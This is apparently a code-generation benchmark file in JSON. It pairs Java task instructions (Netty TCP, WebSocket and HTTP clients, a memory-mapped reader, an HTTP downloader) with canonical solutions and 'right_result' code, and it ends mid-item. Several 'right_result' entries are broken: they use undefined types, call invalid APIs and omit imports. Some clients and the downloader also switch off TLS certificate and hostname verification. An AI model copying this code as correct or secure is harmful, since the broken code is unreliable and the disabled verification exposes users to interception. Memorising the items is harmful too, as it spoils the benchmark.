[
  {
    "Task_id": 10,
    "Instruction": "Task Description: Create a Java class that provides read-only access to file contents using MemorySegment and FileChannel for efficient memory-mapped file operations.\n\nClass Description: MemorySegmentReaderSupplier is a utility class that implements ReaderSupplier interface, designed to provide memory-mapped file reading capabilities. It uses Java NIO's FileChannel to map a file into memory as a MemorySegment, allowing efficient read operations. The class manages memory resources through an Arena and automatically handles resource cleanup.\n\nAttributes:\n- arena: Arena - Manages the lifecycle of the memory segment and ensures proper cleanup\n- memory: MemorySegment - The memory-mapped representation of the file content\n\nMethods:\n- Constructor: MemorySegmentReaderSupplier(Path path) throws IOException - Initializes the reader by opening the specified file and mapping it into memory. Throws IOException if file operations fail.\n- get: get() -> MemorySegmentReader - Returns a new MemorySegmentReader instance for accessing the memory-mapped file content\n- close: close() -> void - Releases all allocated resources by closing the arena and unmapping the memory segment",
    "Canonical_solution": "import java.io.IOException;\nimport java.lang.foreign.Arena;\nimport java.lang.foreign.MemorySegment;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class MemorySegmentReaderSupplier implements ReaderSupplier {\n    private final Arena arena;\n    private final MemorySegment memory;\n\n    public MemorySegmentReaderSupplier(Path path) throws IOException {\n        this.arena = Arena.ofShared();\n        try (var ch = FileChannel.open(path, StandardOpenOption.READ)) {\n            this.memory = ch.map(FileChannel.MapMode.READ_ONLY, 0L, ch.size(), arena);\n        } catch (Throwable e) {\n            arena.close();\n            if (e instanceof IOException) {\n                throw (IOException) e;\n            }\n            throw new RuntimeException(e);\n        }\n    }\n\n    @Override\n    public MemorySegmentReader get() {\n        return new MemorySegmentReader(memory);\n    }\n\n    @Override\n    public void close() {\n        arena.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "import java.io.IOException;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport jdk.incubator.foreign.MemorySegment;\nimport jdk.incubator.foreign.ResourceScope;\nimport jdk.incubator.foreign.SegmentAllocator;\n\npublic class MemorySegmentReaderSupplier implements ReaderSupplier {\n    private final Arena arena;\n    private final MemorySegment memory;\n\n    public MemorySegmentReaderSupplier(Path path) throws IOException {\n        FileChannel channel = FileChannel.open(path, StandardOpenOption.READ);\n        long size = channel.size();\n        channel.close();\n        arena = SegmentAllocator.newArenaWithAlignment(16);\n        memory = arena.allocate(size);\n        try (ResourceScope scope = arena.scope()) {\n            Files.readAllBytes(path).copyInto(memory, scope);\n        }\n    }\n\n    @Override\n    public MemorySegmentReader get() {\n        return new MemorySegmentReader(memory);\n    }\n\n    @Override\n    public void close() {\n        if (arena != null) {\n            arena.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 113,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, send messages, and handle server responses.\n\nClass Description: The TelnetClient class provides functionality to connect to a remote server using TCP, with optional SSL support. It reads input from the console, sends it to the server, and handles the connection lifecycle.\n\nAttributes:\n- SSL: boolean - Flag indicating whether SSL encryption should be used\n- HOST: String - The host address of the remote server (default: \"127.0.0.1\")\n- PORT: int - The port number of the remote server (default: 8023 or 8992 for SSL)\n\nMethods:\n- start(): void - Initializes and starts the TCP client. Handles the connection setup, message sending, and connection teardown. Throws Exception if any error occurs during execution.\n  Input: None\n  Output: None (void)",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic final class TelnetClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8992\" : \"8023\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            sslCtx = SslContext.newClientContext(InsecureTrustManagerFactory.INSTANCE);\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new TelnetClientInitializer(sslCtx));\n\n            Channel ch = b.connect(HOST, PORT).sync().channel();\n\n            ChannelFuture lastWriteFuture = null;\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            for (;;) {\n                String line = in.readLine();\n                if (line == null) {\n                    break;\n                }\n\n                lastWriteFuture = ch.writeAndFlush(line + \"\\r\\n\");\n\n                if (\"bye\".equals(line.toLowerCase())) {\n                    ch.closeFuture().sync();\n                    break;\n                }\n            }\n\n            if (lastWriteFuture != null) {\n                lastWriteFuture.sync();\n            }\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.TimeUnit;\n\npublic class TelnetClient {\n    private final boolean ssl;\n    private final String host;\n    private final int port;\n    private Channel channel;\n\n    public TelnetClient(boolean ssl, String host, int port) {\n        this.ssl = ssl;\n        this.host = host;\n        this.port = port;\n    }\n\n    public TelnetClient(boolean ssl) {\n        this(ssl, \"127.0.0.1\", ssl ? 8992 : 8023);\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioSocketChannel.class)\n                    .option(ChannelOption.TCP_NODELAY, true)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        public void initChannel(SocketChannel ch) throws Exception {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            if (ssl) {\n                                SslContext sslCtx = SslContextBuilder.forClient()\n                                        .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                                        .build();\n                                pipeline.addLast(sslCtx.newHandler(ch.alloc()));\n                            }\n                            pipeline.addLast(new StringEncoder());\n                            pipeline.addLast(new ChannelInboundHandlerAdapter() {\n                                @Override\n                                public void channelActive(ChannelHandlerContext ctx) {\n                                    System.out.println(\"Connected to server\");\n                                }\n\n                                @Override\n                                public void channelRead(ChannelHandlerContext ctx, Object msg) {\n                                    String response = (String) msg;\n                                    System.out.println(\"Server: \" + response);\n                                }\n\n                                @Override\n                                public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n                                    cause.printStackTrace();\n                                    ctx.close();\n                                }\n                            });\n                        }\n                    });\n\n            ChannelFuture future = bootstrap.connect(new InetSocketAddress(host, port)).sync();\n            channel = future.channel();\n\n            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n            while (true) {\n                String line = reader.readLine();\n                if (line == null || line.trim().isEmpty()) continue;\n                channel.writeAndFlush(line + \"\\n\");\n            }\n        } finally {\n            group.shutdownGracefully().sync();\n        }\n    }\n}"
  },
  {
    "Task_id": 139,
    "Instruction": "Task Description: Create a Java class that implements a WebSocket client proxy using Netty framework to establish and manage WebSocket connections to a remote server.\n\nClass Description: The WebsocketProxy class implements the Proxy interface and provides functionality to connect to a WebSocket server using Netty's non-blocking I/O. It handles WebSocket protocol negotiation, connection management, and graceful shutdown of resources.\n\nAttributes: (This class doesn't have any explicit attributes as it's primarily focused on connection management)\n\nMethods:\n1: connect(String serverAddress, int port) -> void - Establishes a WebSocket connection to the specified server address and port. The method:\n   - Creates a WebSocket URI using the provided address and port\n   - Initializes Netty's event loop group and bootstrap\n   - Configures the channel pipeline with necessary handlers (idle state, HTTP codec, WebSocket protocol)\n   - Connects to the server and waits for the connection to close\n   - Ensures proper resource cleanup on shutdown\n   Throws InterruptedException if the connection is interrupted and URISyntaxException if the URI is malformed\n\nInput:\n- serverAddress: String - The IP address or hostname of the WebSocket server\n- port: int - The port number on which the WebSocket server is listening\n\nOutput: None (void) - The method establishes a persistent connection that remains open until closed by either end",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.codec.http.websocketx.*;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.nico.ratel.landlords.client.handler.WebsocketTransferHandler;\nimport org.nico.ratel.landlords.print.SimplePrinter;\n\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.concurrent.TimeUnit;\n\npublic class WebsocketProxy implements Proxy {\n\n    @Override\n    public void connect(String serverAddress, int port) throws InterruptedException, URISyntaxException {\n        URI uri = new URI(\"ws://\" + serverAddress + \":\" + port + \"/ratel\");\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap()\n                    .group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline()\n                                    .addLast(new IdleStateHandler(60 * 30, 0, 0, TimeUnit.SECONDS))\n                                    .addLast(new HttpClientCodec())\n                                    .addLast(new HttpObjectAggregator(8192))\n                                    .addLast(new WebSocketClientProtocolHandler(uri\n                                            , WebSocketVersion.V13\n                                            , null\n                                            , true\n                                            , new DefaultHttpHeaders(), 100000))\n                                    .addLast(\"ws\", new WebsocketTransferHandler());\n                        }\n                    });\n            SimplePrinter.printNotice(\"Connecting to \" + serverAddress + \":\" + port);\n            Channel channel = bootstrap.connect(serverAddress, port).sync().channel();\n            channel.closeFuture().sync();\n        } finally {\n            group.shutdownGracefully().sync();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpRequest;\nimport io.netty.handler.codec.http.HttpMethod;\nimport io.netty.handler.codec.http.HttpVersion;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshaker;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshakerFactory;\nimport io.netty.handler.codec.http.websocketx.WebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.TextWebSocketFrame;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.CharsetUtil;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class WebsocketProxy implements Proxy {\n    private final AtomicBoolean connected = new AtomicBoolean(false);\n    private final EventLoopGroup group;\n    private Channel channel;\n    private WebSocketClientHandshaker handshaker;\n\n    public WebsocketProxy() {\n        this.group = new NioEventLoopGroup();\n    }\n\n    @Override\n    public void connect(String serverAddress, int port) throws URISyntaxException, InterruptedException {\n        String uri = \"ws://\" + serverAddress + \":\" + port;\n        URI websocketUri = new URI(uri);\n        String host = websocketUri.getHost();\n        int wsPort = websocketUri.getPort();\n\n        handshaker = WebSocketClientHandshakerFactory.newHandshaker(\n                websocketUri, WebSocketVersion.V13, null, false, null);\n\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.TCP_NODELAY, true)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new IdleStateHandler(0, 0, 60, TimeUnit.SECONDS));\n                        ch.pipeline().addLast(new HttpClientCodec());\n                        ch.pipeline().addLast(new HttpObjectAggregator(65536));\n                        ch.pipeline().addLast(handshaker);\n                        ch.pipeline().addLast(new WebSocketFrameHandler());\n                    }\n                });\n\n        ChannelFuture future = bootstrap.connect(host, wsPort).sync();\n        channel = future.channel();\n        handshaker.handshake(channel).sync();\n\n        if (handshaker.isHandshakeComplete()) {\n            connected.set(true);\n            System.out.println(\"WebSocket connection established.\");\n        } else {\n            throw new RuntimeException(\"WebSocket handshake failed.\");\n        }\n\n        future.channel().closeFuture().sync();\n    }\n\n    private class WebSocketFrameHandler extends SimpleChannelInboundHandler<WebSocketFrame> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, WebSocketFrame frame) {\n            if (frame instanceof TextWebSocketFrame) {\n                String text = ((TextWebSocketFrame) frame).text();\n                System.out.println(\"Received: \" + text);\n            } else if (frame instanceof CloseWebSocketFrame) {\n                channel.close();\n            }\n        }\n\n        @Override\n        public void handlerAdded(ChannelHandlerContext ctx) {\n            if (!handshaker.isHandshakeComplete()) {\n                handshaker.handshake(ctx.channel()).addListener(future -> {\n                    if (future.isSuccess()) {\n                        System.out.println(\"WebSocket handshake complete.\");\n                    } else {\n                        System.err.println(\"WebSocket handshake failed.\");\n                        channel.close();\n                    }\n                });\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n\n    public void shutdown() {\n        if (connected.get()) {\n            channel.close();\n            group.shutdownGracefully();\n        }\n    }\n}"
  },
  {
    "Task_id": 144,
    "Instruction": "Task Description: Create a Java class that implements a HTTP client using Netty framework to send HTTP requests and receive responses.\n\nClass Description: The HttpSnoopClient class is a Netty-based HTTP client that establishes TCP connections, sends HTTP requests, and handles responses. It supports SSL/TLS connections and provides methods for connection management.\n\nAttributes:\n- group: [NioEventLoopGroup] - Manages event loops for client I/O operations\n- bootstrap: [Bootstrap] - Configures and initializes the Netty client\n- channel: [Channel] - Represents the active network connection\n\nMethods:\n- HttpSnoopClient(): [Constructor] -> [void] - Initializes the event loop group and bootstrap instance\n- connect(String host, int port, SslContext sslCtx): [void] -> [void] - Establishes a connection to the specified host and port with optional SSL context\n- sendRequest(URI uri, String host): [void] -> [void] - Sends an HTTP GET request to the specified URI with appropriate headers\n- waitForClose(): [void] -> [void] - Waits for the channel to close\n- shutdown(): [void] -> [void] - Shuts down the event loop group gracefully\n- createSslContext(): [static] -> [SslContext] - Creates and returns an SSL context with insecure trust manager for testing purposes",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.codec.http.cookie.ClientCookieEncoder;\nimport io.netty.handler.codec.http.cookie.DefaultCookie;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.net.URI;\n\npublic final class HttpSnoopClient {\n\n    static final String URL = System.getProperty(\"url\", \"http://127.0.0.1:8080/\");\n\n    private final EventLoopGroup group;\n    private final Bootstrap bootstrap;\n    private Channel channel;\n\n    public HttpSnoopClient() {\n        group = new NioEventLoopGroup();\n        bootstrap = new Bootstrap();\n    }\n\n    public void connect(String host, int port, SslContext sslCtx) throws InterruptedException {\n        bootstrap.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new HttpSnoopClientInitializer(sslCtx));\n        channel = bootstrap.connect(host, port).sync().channel();\n    }\n\n    public void sendRequest(URI uri, String host) {\n        HttpRequest request = new DefaultFullHttpRequest(\n                HttpVersion.HTTP_1_1, HttpMethod.GET, uri.getRawPath());\n        request.headers().set(HttpHeaderNames.HOST, host);\n        request.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.CLOSE);\n        request.headers().set(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.GZIP);\n        request.headers().set(\n                HttpHeaderNames.COOKIE,\n                ClientCookieEncoder.STRICT.encode(\n                        new DefaultCookie(\"my-cookie\", \"foo\"),\n                        new DefaultCookie(\"another-cookie\", \"bar\")));\n        channel.writeAndFlush(request);\n    }\n\n    public void waitForClose() throws InterruptedException {\n        channel.closeFuture().sync();\n    }\n\n    public void shutdown() {\n        group.shutdownGracefully();\n    }\n\n    public static SslContext createSslContext() throws Exception {\n        return SslContextBuilder.forClient()\n            .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpRequest;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpHeaders;\nimport io.netty.handler.codec.http.HttpMethod;\nimport io.netty.handler.codec.http.HttpRequest;\nimport io.netty.handler.codec.http.HttpVersion;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.concurrent.TimeUnit;\n\npublic class HttpSnoopClient {\n    private final EventLoopGroup group;\n    private final Bootstrap bootstrap;\n    private Channel channel;\n\n    public HttpSnoopClient() {\n        group = new NioEventLoopGroup();\n        bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new HttpClientCodec());\n                    }\n                });\n    }\n\n    public void connect(String host, int port, SslContext sslCtx) {\n        bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) {\n                ch.pipeline().addLast(sslCtx.newHandler(ch.alloc()));\n                ch.pipeline().addLast(new HttpClientCodec());\n            }\n        });\n\n        ChannelFuture future = bootstrap.connect(host, port).syncUninterruptibly();\n        channel = future.channel();\n    }\n\n    public void sendRequest(URI uri, String host) throws URISyntaxException {\n        HttpRequest request = new DefaultFullHttpRequest(\n                HttpVersion.HTTP_1_1,\n                HttpMethod.GET,\n                uri.toString(),\n                HttpHeaders.EMPTY_BUFFER);\n\n        request.headers().set(HttpHeaders.Names.HOST, host);\n        request.headers().set(HttpHeaders.Names.USER_AGENT, \"HttpSnoopClient\");\n\n        channel.writeAndFlush(request);\n    }\n\n    public void waitForClose() {\n        if (channel != null) {\n            channel.closeFuture().syncUninterruptibly();\n        }\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.close();\n        }\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static SslContext createSslContext() {\n        return SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                .build();\n    }\n}"
  },
  {
    "Task_id": 246,
    "Instruction": "Task Description: Create a Java class that provides HTTP client functionality for making POST requests and JSON requests to RESTful APIs, with support for both JSON and form-data payloads, and proper response handling.\n\nClass Description: The Network class is a utility class that encapsulates HTTP client operations for interacting with RESTful APIs. It provides methods for making POST requests with flexible parameter formats (JSON or form-data) and a specialized method for making requests that expect JSON responses.\n\nAttributes:\n\nhttpClient: [HttpClient] - A shared HTTP client instance used for all requests, initialized as a static final variable to ensure thread-safety and reuse.\n\nMethods:\n\nmakePOSTRequest: [Name](String url, Map<Object, Object> parameters, Map<String, String> headers, boolean convertParamtersToJSON) -> [HttpResponse<String>] - Makes a POST request to the specified URL with the given parameters and headers. The convertParamtersToJSON flag determines whether parameters are sent as JSON or form-urlencoded data.\n\nbuildFormDataFromMap: [Name](Map<Object, Object> data) -> [HttpRequest.BodyPublisher] - A private helper method that converts a Map into form-urlencoded string format for POST requests.\n\nmakeJsonRequest: [Name](String url) -> [JsonElement] - Makes a GET request to the specified URL and parses the response as JSON, throwing an IOException if the request fails.\n\nfailure: [Name](int statusCode) -> [boolean] - A private helper method that checks if an HTTP status code indicates failure (outside 200-299 range).",
    "Canonical_solution": "import com.google.gson.Gson;\nimport com.google.gson.JsonElement;\nimport com.google.gson.JsonParser;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpRequest.BodyPublishers;\nimport java.net.http.HttpResponse;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Map;\n\npublic class Network {\n\n    private static final HttpClient httpClient = HttpClient.newHttpClient();\n\n    public static HttpResponse<String> makePOSTRequest(String url, Map<Object, Object> parameters, Map<String, String> headers, boolean convertParamtersToJSON) throws IOException, InterruptedException {\n        Gson gson = new Gson();\n        String JSONParameters = gson.toJson(parameters);\n\n        HttpRequest.Builder requestBuilder = HttpRequest.newBuilder(URI.create(url))\n                .POST(convertParamtersToJSON ? BodyPublishers.ofString(JSONParameters) : buildFormDataFromMap(parameters));\n\n        for (Map.Entry<String, String> entry : headers.entrySet())\n            requestBuilder.header(entry.getKey(), entry.getValue());\n\n        HttpRequest request = requestBuilder.build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    private static HttpRequest.BodyPublisher buildFormDataFromMap(Map<Object, Object> data) {\n        var builder = new StringBuilder();\n        for (Map.Entry<Object, Object> entry : data.entrySet()) {\n            if (builder.length() > 0) {\n                builder.append(\"&\");\n            }\n            builder.append(URLEncoder.encode(entry.getKey().toString(), StandardCharsets.UTF_8));\n            builder.append(\"=\");\n            builder.append(URLEncoder.encode(entry.getValue().toString(), StandardCharsets.UTF_8));\n        }\n        return HttpRequest.BodyPublishers.ofString(builder.toString());\n    }\n\n    static JsonElement makeJsonRequest(String url) throws IOException {\n        try {\n            HttpResponse<InputStream> response = httpClient.send(HttpRequest.newBuilder(URI.create(url)).build(),\n                    HttpResponse.BodyHandlers.ofInputStream());\n            if (failure(response.statusCode())) {\n                throw new IOException(\"HTTP Response was \" + response);\n            }\n            return JsonParser.parseReader(new BufferedReader(new InputStreamReader(response.body())));\n        } catch (InterruptedException e) {\n            throw new IOException(e);\n        }\n    }\n\n    private static boolean failure(int statusCode) {\n        return statusCode < 200 || statusCode > 299;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "right_result": "import java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.net.URI;\nimport java.util.Map;\nimport java.util.stream.Collectors;\nimport com.google.gson.JsonElement;\nimport com.google.gson.JsonParser;\n\npublic class Network {\n    private static final HttpClient httpClient = HttpClient.newHttpClient();\n\n    public HttpResponse<String> makePOSTRequest(String url, Map<Object, Object> parameters, Map<String, String> headers, boolean convertParametersToJSON) throws Exception {\n        HttpRequest.Builder requestBuilder = HttpRequest.newBuilder()\n                .uri(URI.create(url))\n                .headers(headers.entrySet().stream()\n                        .collect(Collectors.toMap(Map.Entry::getKey, e -> e.getValue(), (a, b) -> a))\n                );\n\n        if (convertParametersToJSON) {\n            String jsonBody = new Gson().toJson(parameters);\n            requestBuilder.setHeader(\"Content-Type\", \"application/json\");\n            requestBuilder.POST(HttpRequest.BodyPublishers.ofString(jsonBody));\n        } else {\n            String formData = buildFormDataFromMap(parameters);\n            requestBuilder.setHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n            requestBuilder.POST(HttpRequest.BodyPublishers.ofString(formData));\n        }\n\n        return httpClient.send(requestBuilder.build(), HttpResponse.BodyHandlers.ofString());\n    }\n\n    private String buildFormDataFromMap(Map<Object, Object> data) {\n        return data.entrySet().stream()\n                .map(e -> e.getKey() + \"=\" + e.getValue())\n                .collect(Collectors.joining(\"&\"));\n    }\n\n    public JsonElement makeJsonRequest(String url) throws Exception {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(url))\n                .GET()\n                .build();\n\n        HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n\n        if (failure(response.statusCode())) {\n            throw new IOException(\"Request failed with status code: \" + response.statusCode());\n        }\n\n        return JsonParser.parseString(response.body());\n    }\n\n    private boolean failure(int statusCode) {\n        return statusCode < 200 || statusCode >= 300;\n    }\n}"
  },
  {
    "Task_id": 249,
    "Instruction": "Task Description: Create a Java class for HTTP downloading with support for multi-threaded downloads, range requests, and connection pooling.\n\nClass Description: HttpDownloader is a Java class that extends InputStream to provide HTTP downloading capabilities. It supports multi-threaded downloads, range requests, connection pooling, and retry mechanisms. The class manages download tasks through a thread pool and handles response streaming efficiently.\n\nAttributes:\n\ncontentType: String - MIME type of the downloaded content\ncontentLength: long - Total size of the content being downloaded\ncontentEnd: long - Ending byte position for downloads\nheader: Headers - HTTP response headers\nstatusCode: int - HTTP status code\ndirectUrl: String - Final URL after redirects\ncurConnId: volatile static int - Connection counter\nclosed: volatile boolean - Flag indicating if downloader is closed\nconnId: int - Current connection ID\nis: InputStream - Current input stream\ncallableQueue: Queue<Callable<InputStream>> - Queue of download tasks\nfutureQueue: Queue<Future<InputStream>> - Queue of future results\ndownloaderMap: static HashMap<String, HttpDownloader> - Cache of active downloaders\nexecutorService: ExecutorService - Thread pool for download tasks\nsupportRange: boolean - Flag for server range support\nblockSize: int - Size of each download block (default 10MB)\nthreadNum: int - Number of download threads (default 2)\ncookie: String - Cookie header value\nreferer: String - Referer header value\nblockCounter: int - Counter for downloaded blocks\ndownloadClient: OkHttpClient - Custom HTTP client for downloads\ndefaultClient: OkHttpClient - Default HTTP client configuration\n\nMethods:\n\nHttpDownloader(Map<String, String> params) - Constructor - Initializes downloader with configuration parameters\ncreateDownloadTask(String url, Map<String, String> headers) - void - Creates download tasks based on range and thread configuration\ndownloadTask(String url, Map<String, String> headers, String range, int sliceNum) -> InputStream - Performs actual HTTP download\n_downloadTask(String url, Map<String, String> headers, String range, int sliceNum) -> InputStream - Internal download implementation\nread(byte[] buffer, int off, int len) -> int - Reads data from download stream\nread() -> int - Throws IOException (not implemented)\nclose() - void - Cleans up resources and stops downloads\nrunTask(int num) - void - Starts specified number of download tasks",
    "Canonical_solution": "import java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.Map;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.TreeMap;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.Future;\nimport java.util.Queue;\nimport java.util.LinkedList;\nimport java.util.regex.Pattern;\nimport java.util.regex.Matcher;\nimport java.net.URL;\nimport java.util.HashMap;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.Callable;\n\nimport okhttp3.OkHttpClient;\nimport okhttp3.Dispatcher;\nimport okhttp3.FormBody;\nimport okhttp3.RequestBody;\nimport okhttp3.Request;\nimport okhttp3.Headers;\nimport okhttp3.Response;\nimport okhttp3.Call;\nimport org.json.JSONObject;\n\npublic class HttpDownloader extends InputStream {\n    public String contentType = \"\";\n    public long contentLength = -1;\n    long contentEnd;\n    public Headers header;\n    public int statusCode = 200;\n    String directUrl = null;\n    volatile static int curConnId = 0;\n    volatile boolean closed = false;\n    int connId;\n    InputStream is = null;\n    Queue<Callable<InputStream>> callableQueue = new LinkedList<>();\n    Queue<Future<InputStream>> futureQueue = new LinkedList<>();\n    static HashMap<String, HttpDownloader> downloaderMap = new HashMap<>();\n    ExecutorService executorService = Executors.newFixedThreadPool(128);\n    boolean supportRange = true;\n    int blockSize = 10 * 1024 * 1024;\n    int threadNum = 2;\n    String cookie = null;\n    String referer = null;\n    int blockCounter = 0;\n    OkHttpClient downloadClient = null;\n    OkHttpClient defaultClient = new OkHttpClient.Builder()\n        .connectTimeout(30, TimeUnit.SECONDS)\n        .readTimeout(30, TimeUnit.SECONDS)\n        .writeTimeout(30, TimeUnit.SECONDS)\n        .hostnameVerifier((hostname, session) -> true)\n        .sslSocketFactory(new MySSLCompat(), MySSLCompat.TM)\n        .build();\n\n    public HttpDownloader(Map<String, String> params) {\n        Dispatcher dispatcher = new Dispatcher();\n        dispatcher.setMaxRequests(3000000);\n        dispatcher.setMaxRequestsPerHost(1000000);\n        downloadClient = defaultClient.newBuilder()\n            .dispatcher(dispatcher)\n            .connectTimeout(3, TimeUnit.SECONDS)\n            .readTimeout(3, TimeUnit.SECONDS)\n            .writeTimeout(3, TimeUnit.SECONDS)\n            .build();\n        \n        connId = curConnId++;\n        String url = params.get(\"url\");\n        downloaderMap.entrySet().removeIf(entry -> 